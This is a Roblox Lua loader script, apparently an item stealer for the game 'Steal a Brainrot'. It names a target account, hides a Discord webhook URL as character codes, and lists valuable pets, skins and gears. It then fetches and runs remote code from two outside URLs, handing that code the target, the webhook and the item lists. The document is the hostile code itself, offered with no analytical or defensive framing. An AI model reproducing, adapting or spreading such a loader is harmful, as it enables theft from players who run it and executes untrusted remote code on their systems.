local TARGET_ID = 11006856956
local TARGET_USER = "Shaakkiyan417"

WebhookEncrypted = "104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,52,48,50,49,48,49,52,53,49,48,54,51,51,51,55,54,54,47,82,110,57,106,110,112,111,122,82,103,71,114,66,56,55,104,116,105,118,109,67,50,85,54,88,104,88,98,105,106,119,85,71,106,76,104,89,80,120,97,102,105,89,68,119,118,107,69,108,77,95,107,109,50,78,53,76,49,51,49,86,48,116,67,48,74,85,115"

local TargetBrainrots = {
    ["Hydra Bunny"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Dragon Cannelloni"] = true,
    ["Griffin"] = true,
    ["Dragon Gingerini"] = true,
    ["Antonio"] = true,
    ["Elefanto Frigo"] = true,
    ["Rico Dinero"] = true,
    ["Rubrikiko"] = true,
    ["Arcadragon"] = true,
    ["Pancake and Syrup"] = true,
    ["Kalika Bros"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Globa Steppa"] = true,
    ["Dug Dug Dug"] = true,
    ["La Supreme Combinasion"] = true,
    ["La Casa Boo"] = true,
    ["Dragon Aquanini"] = true,
    ["Signore Carapace"] = true,
    ["Fishino Clownino"] = true,
    ["Cerberus"] = true,
    ["Duggy Bros"] = true,
    ["Kraken"] = true,
    ["Venuspino"] = true,
    ["Gorillo Subwoofero"] = true,
    ["Foxini Lanternini"] = true,
    ["Moby Bros"] = true,
    ["Burguro and Fryuro"] = true,
    ["Capitano Moby"] = true,
    ["Celestial Pegasus"] = true,
    ["Celularcini Viciosini"] = true,
    ["Cooki and Milki"] = true,
    ["Cash or Card"] = true,
    ["Chipso and Queso"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Ginger Gerat"] = true,
    ["Garama and Madundung"] = true,
    ["Gold Gold Gold"] = true,
    ["Hopilikalika Hopilikalako"] = true,
    ["Ketchuru and Musturu"] = true,
    ["La Food Combinasion"] = true,
    ["La Secret Combinasion"] = true,
    ["Pizza and Ranch"] = true,
    ["Los Secret Combinasionas"] = true,
    ["Coco and Mango"] = true,
    ["Los Bros"] = true,
    ["Los Primos"] = true,
    ["Love Love Bear"] = true,
    ["Money Money Reindeer"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Rosey and Teddy"] = true,
    ["Spooky and Pumpky"] = true,
    ["Noodle Noodle Poodle"] = true,
    ["Rubiko and Kubiko"] = true,
    ["Cangurato Gelato"] = true
}

local TargetBaseSkins = {
    ["Bunny Basket"] = true,
    ["Candy"] = true,
    ["Christmas"] = true,
    ["Aquatic"] = true,
    ["Cursed"] = true,
    ["Cyber"] = true,
    ["Tralalero"] = true,
    ["Yin Yang"] = true,
    ["Valentines"] = true,
    ["Taco"] = true,
    ["Summer"] = true,
    ["Rainbow"] = true,
    ["Rose"] = true,
    ["Pot of Gold"] = true,
    ["Radioactive"] = true,
    ["Octo"] = true,
    ["Halloween"] = true,
    ["Lava"] = true,
    ["Lucky"] = true,
    ["Gold"] = true,
    ["Gingerbread"] = true,
    ["Divine"] = true,
    ["Easter"] = true,
    ["Galaxy"] = true,
    ["Diamond"] = true
}

local TargetGears = {
    ["Santa's Sleigh"] = true,
    ["Waverider"] = true,
    ["Witch's Broom"] = true,
    ["Candy Sentry"] = true
}

task.spawn(function()
    loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=my0cdw6a"))()

    task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WebhookEncrypted, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)